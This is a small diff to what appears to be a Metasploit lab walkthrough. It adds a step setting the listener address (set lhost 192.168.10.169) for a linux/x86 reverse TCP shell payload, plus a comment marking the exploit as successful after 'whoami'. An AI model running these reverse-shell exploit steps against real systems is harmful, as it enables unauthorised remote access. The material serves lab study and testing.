@@ -45,6 +45,9 @@ payload => linux/x86/shell/reverse_tcp
 # let again check the options 
 msf.....>options 
 
+# IMPORTANT: If you have 2 network interfaces, you need to set the right one 
+msf.....>set lhost 192.168.10.169
+
 # now let's try if it would work 
 msf....>check 
 
@@ -53,6 +56,8 @@ msf....>exploit
 
 # Try to get some info now 
 whoami 
+
+# Yes, we are successful
 ```
 
 ## Ref: (normal privileges)
